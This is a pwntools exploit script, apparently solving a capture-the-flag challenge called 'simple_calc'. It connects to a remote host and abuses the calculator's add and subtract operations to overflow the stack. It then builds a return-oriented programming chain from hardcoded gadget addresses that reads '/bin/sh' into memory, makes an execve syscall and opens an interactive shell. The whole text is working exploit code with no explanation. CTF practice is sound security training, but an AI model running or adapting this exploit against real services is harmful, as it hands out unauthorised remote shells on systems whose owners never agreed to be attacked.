from pwn import *

context(log_level = "Debug", os = "linux", arch = "amd64")
io = process("./simple_calc")
e = ELF("./simple_calc")
io = remote("114.55.66.54", 10001)
# gdb.attach(io)


def sendT():
	io.sendline("1")
	io.sendline("42")
	io.sendline("42")
	io.recv()
	sleep(0.1)

def send0():
	io.sendline("2")
	io.sendline("42")
	io.sendline("42")
	io.recv()
	sleep(0.1)

def sendadd(num):
	io.sendline("1")
	io.sendline("42")
	io.sendline(str(num - 42))
	io.recv()
	sleep(0.1)

def sendsub(num):
	io.sendline("2")
	io.sendline(str(num + 42))
	io.sendline("42")
	io.recv()
	sleep(0.1)

pop_rdi = 0x401b73
pop_rax = 0x44db34
pop_rsi = 0x401c87
pop_rdx = 0x437a85
read = 0x434B20
binsh_addr = 0x6C2C61
syscall = 0x400488

io.sendline("200")
for i in range(12):
	sendT()
for i in range(2):
	send0()
for i in range(4):
	sendT()

sendadd(pop_rdi)
send0()
send0()
send0()			# 0
sendadd(pop_rsi)
send0()
sendadd(binsh_addr)
send0()			# ptr
sendadd(pop_rdx)
send0()
sendsub(8)
send0()			#size
sendadd(read)
send0()
sendadd(pop_rax)
send0()
sendsub(0x3b)
send0()
sendadd(pop_rdx)
send0()
send0()
send0()
sendadd(pop_rdi)
send0()
sendadd(binsh_addr)
send0()
sendadd(pop_rsi)
send0()
send0()
send0()
sendadd(syscall)


io.sendline("5")
sleep(5)
io.send("/bin/sh\x00")
io.interactive()